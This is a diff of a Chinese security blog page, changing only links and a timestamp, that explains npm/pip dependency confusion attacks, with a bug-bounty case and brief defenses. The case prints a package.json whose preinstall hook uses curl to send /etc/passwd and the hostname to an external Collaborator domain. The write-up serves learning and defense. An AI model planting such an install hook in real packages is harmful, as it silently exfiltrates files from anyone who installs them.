@@ -22,18 +22,18 @@
     <meta name="description" content="依赖混淆于2021年初发现，较为新颖。再一篇技术src博客中看到 这里学习并做一下记录（理论复现） 是一种高危的软件供应链攻击技术，核心在于利用现代包管理器（如 npm、pip、RubyGems 等）在解析和下载依赖项时的设计缺陷或配置不当，欺骗系统去公共代码库下载攻击者伪造的恶意包，（原本是从企业内部的私有代码库下载正确的内部包）  参考文章 漏洞成因本质就是替换掉正常包为攻击者的恶意包而达到">
 <meta property="og:type" content="article">
 <meta property="og:title" content="依赖混淆.md">
-<meta property="og:url" content="https://i4g5d.github.io/2026/03/19/%E4%BE%9D%E8%B5%96%E6%B7%B7%E6%B7%86-md/index.html">
+<meta property="og:url" content="https://i4g5d.github.io/2026/03/19/%E4%BE%9D%E8%B5%96%E6%B7%B7%E6%B7%86/index.html">
 <meta property="og:site_name" content="i4G5d-Blog">
 <meta property="og:description" content="依赖混淆于2021年初发现，较为新颖。再一篇技术src博客中看到 这里学习并做一下记录（理论复现） 是一种高危的软件供应链攻击技术，核心在于利用现代包管理器（如 npm、pip、RubyGems 等）在解析和下载依赖项时的设计缺陷或配置不当，欺骗系统去公共代码库下载攻击者伪造的恶意包，（原本是从企业内部的私有代码库下载正确的内部包）  参考文章 漏洞成因本质就是替换掉正常包为攻击者的恶意包而达到">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://i4g5d.github.io/2026/03/19/%E4%BE%9D%E8%B5%96%E6%B7%B7%E6%B7%86-md/image-20260319145752903.png">
-<meta property="og:image" content="https://i4g5d.github.io/2026/03/19/%E4%BE%9D%E8%B5%96%E6%B7%B7%E6%B7%86-md/image-20260319145920430.png">
-<meta property="og:image" content="https://i4g5d.github.io/2026/03/19/%E4%BE%9D%E8%B5%96%E6%B7%B7%E6%B7%86-md/image-20260319145928780.png">
+<meta property="og:image" content="https://i4g5d.github.io/2026/03/19/%E4%BE%9D%E8%B5%96%E6%B7%B7%E6%B7%86/image-20260319145752903.png">
+<meta property="og:image" content="https://i4g5d.github.io/2026/03/19/%E4%BE%9D%E8%B5%96%E6%B7%B7%E6%B7%86/image-20260319145920430.png">
+<meta property="og:image" content="https://i4g5d.github.io/2026/03/19/%E4%BE%9D%E8%B5%96%E6%B7%B7%E6%B7%86/image-20260319145928780.png">
 <meta property="article:published_time" content="2026-03-19T06:56:21.000Z">
-<meta property="article:modified_time" content="2026-03-19T06:59:31.341Z">
+<meta property="article:modified_time" content="2026-03-19T07:06:38.072Z">
 <meta property="article:author" content="i4G5d">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://i4g5d.github.io/2026/03/19/%E4%BE%9D%E8%B5%96%E6%B7%B7%E6%B7%86-md/image-20260319145752903.png">
+<meta name="twitter:image" content="https://i4g5d.github.io/2026/03/19/%E4%BE%9D%E8%B5%96%E6%B7%B7%E6%B7%86/image-20260319145752903.png">
   
   
   
@@ -294,7 +294,7 @@
 <h2 id="攻击链"><a href="#攻击链" class="headerlink" title="攻击链"></a>攻击链</h2><h3 id="1-包名侦查与获取"><a href="#1-包名侦查与获取" class="headerlink" title="1.包名侦查与获取"></a>1.包名侦查与获取</h3><p>获取方式主要如下几种</p>
 <ol>
 <li><p><strong>公开代码库</strong>：一种直接的来源，有些公司会开源部分源码，可能存在package.json、requirements.txt或pom.xml，这些里面直接引用了大量内部包名<br> 下图就是某次测试中找到的Nuget仓库</p>
-<p><img src="/2026/03/19/%E4%BE%9D%E8%B5%96%E6%B7%B7%E6%B7%86-md/image-20260319145752903.png" srcset="/img/loading.gif" lazyload alt="image-20260319145752903"></p>
+<p><img src="/2026/03/19/%E4%BE%9D%E8%B5%96%E6%B7%B7%E6%B7%86/image-20260319145752903.png" srcset="/img/loading.gif" lazyload></p>
 </li>
 <li><p><strong>js source map，前端错误监控：</strong> 打包后的JavaScript文件如果包含source map，或者错误堆栈被发送到公开的监控平台，内部依赖的名称就可能暴露。</p>
 </li>
@@ -325,12 +325,12 @@
 <h3 id="3-代码触发"><a href="#3-代码触发" class="headerlink" title="3. 代码触发"></a>3. 代码触发</h3><p>恶意包发布后，攻击者只需等待。触发可能发生在多种场景：开发者本地运行npm install更新依赖、CI&#x2F;CD系统执行定时构建、新员工克隆项目并安装依赖、依赖缓存过期后的重新拉取。</p>
 <p>值得注意的是，即使企业的生产构建严格锁定了依赖版本，开发环境和CI&#x2F;CD的”测试分支”往往没有同等严格的控制。攻击者可能首先获得的是开发者的本地机器或测试环境的访问权限，然后以此为跳板进一步渗透</p>
 <h3 id="4-外带与持久化"><a href="#4-外带与持久化" class="headerlink" title="4. 外带与持久化"></a>4. 外带与持久化</h3><p>只需要带外出 API密钥，数据库凭证，SSH私钥，AKSK等环境变量&#x2F;配置文件，就能尝试构建持久化访问，留后门，扩大污染</p>
-<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>实际的赏金漏洞中，难以证明影响<br> 站点<strong>redacted.com</strong>, BP的插件<code>JS Miner</code>中，依赖项中发现了非公共库的包名<br> <code>recovery-npm-package</code><br> <img src="/2026/03/19/%E4%BE%9D%E8%B5%96%E6%B7%B7%E6%B7%86-md/image-20260319145920430.png" srcset="/img/loading.gif" lazyload alt="image-20260319145920430"><br> 怀疑可能存在 <strong>依赖混淆（dependency confusion）</strong> 的情况。应用似乎引用了一个未公开注册的内部依赖。如果构建过程从公共 npm 注册表解析依赖项，攻击者可能注册同名包并将恶意代码注入构建管道。<br> 正确注册了它，并准备了一个更受控的有效载荷，以捕获清晰的执行证据。</p>
+<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>实际的赏金漏洞中，难以证明影响<br> 站点<strong>redacted.com</strong>, BP的插件<code>JS Miner</code>中，依赖项中发现了非公共库的包名<br> <code>recovery-npm-package</code><br> <img src="/2026/03/19/%E4%BE%9D%E8%B5%96%E6%B7%B7%E6%B7%86/image-20260319145920430.png" srcset="/img/loading.gif" lazyload><br> 怀疑可能存在 <strong>依赖混淆（dependency confusion）</strong> 的情况。应用似乎引用了一个未公开注册的内部依赖。如果构建过程从公共 npm 注册表解析依赖项，攻击者可能注册同名包并将恶意代码注入构建管道。<br> 正确注册了它，并准备了一个更受控的有效载荷，以捕获清晰的执行证据。</p>
 <p>包中包含两个文件：一个简单的 <code>index.js</code> 和一个包含 <strong>preinstall 钩子</strong> 的 <code>package.json</code>。</p>
 <p><code>package.json</code> 内容如下：</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span>  <br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;recovery-npm-package&quot;</span><span class="hljs-punctuation">,</span>  <br>  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.0.32&quot;</span><span class="hljs-punctuation">,</span>  <br>  <span class="hljs-attr">&quot;description&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;anything you want&quot;</span><span class="hljs-punctuation">,</span>  <br>  <span class="hljs-attr">&quot;main&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;index.js&quot;</span><span class="hljs-punctuation">,</span>  <br>  <span class="hljs-attr">&quot;scripts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span>  <br>    <span class="hljs-attr">&quot;preinstall&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/usr/bin/curl --data &#x27;@/etc/passwd&#x27; $(hostname).[COLLABORATOR-ID].oastify.com&quot;</span>  <br>  <span class="hljs-punctuation">&#125;</span>  <br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p>如果任何系统安装这个包，<strong>preinstall 脚本会自动执行</strong>，并将 <code>/etc/passwd</code> 内容连同执行安装的主机名发送到我的 <strong>Burp Collaborator 服务器</strong>。<br> 几分钟内，我的 Burp Collaborator 仪表盘开始接收到交互请求。起初只是一个请求，随后又一个，然后是更多请求。<br> <img src="/2026/03/19/%E4%BE%9D%E8%B5%96%E6%B7%B7%E6%B7%86-md/image-20260319145928780.png" srcset="/img/loading.gif" lazyload alt="image-20260319145928780"><br> 每个交互都包含 HTTP 请求，内含 <code>/etc/passwd</code> 内容，以及执行系统的主机名和元数据。多个 IP 地址访问我的 Collaborator 域。有效载荷已成功执行，这确认了恶意包已在某处安装，preinstall 钩子在安装过程中执行。<br> 到这就证明了依赖混淆攻击的RCE<br> 但甲方说：<br> 回调的 IP 是中国的云服务器，不是目标公司的内网 CI&#x2F;CD 系统。<br> 公司内部项目用了 <strong>YarnLock 文件</strong>（锁死了真实依赖的哈希和来源），所以恶意的同名包根本进不去核心构建系统。</p>
+<p>如果任何系统安装这个包，<strong>preinstall 脚本会自动执行</strong>，并将 <code>/etc/passwd</code> 内容连同执行安装的主机名发送到我的 <strong>Burp Collaborator 服务器</strong>。<br> 几分钟内，我的 Burp Collaborator 仪表盘开始接收到交互请求。起初只是一个请求，随后又一个，然后是更多请求。<br> <img src="/2026/03/19/%E4%BE%9D%E8%B5%96%E6%B7%B7%E6%B7%86/image-20260319145928780.png" srcset="/img/loading.gif" lazyload><br> 每个交互都包含 HTTP 请求，内含 <code>/etc/passwd</code> 内容，以及执行系统的主机名和元数据。多个 IP 地址访问我的 Collaborator 域。有效载荷已成功执行，这确认了恶意包已在某处安装，preinstall 钩子在安装过程中执行。<br> 到这就证明了依赖混淆攻击的RCE<br> 但甲方说：<br> 回调的 IP 是中国的云服务器，不是目标公司的内网 CI&#x2F;CD 系统。<br> 公司内部项目用了 <strong>YarnLock 文件</strong>（锁死了真实依赖的哈希和来源），所以恶意的同名包根本进不去核心构建系统。</p>
 <p>那些触发 RCE 的回调，其实是互联网上自动监控 npm 镜像源的<strong>第三方安全扫描器或爬虫</strong>。只要有人发新包，它们就会自动拉取分析，从而踩中了作者的陷阱。</p>
 <h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><p>具体的手段就不记了，引用的文章中有记录，这里就提一下大方向</p>
 <ol>
@@ -377,7 +377,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>依赖混淆.md</div>
-      <div>https://i4g5d.github.io/2026/03/19/依赖混淆-md/</div>
+      <div>https://i4g5d.github.io/2026/03/19/依赖混淆/</div>
     </div>
     <div class="license-meta">
       
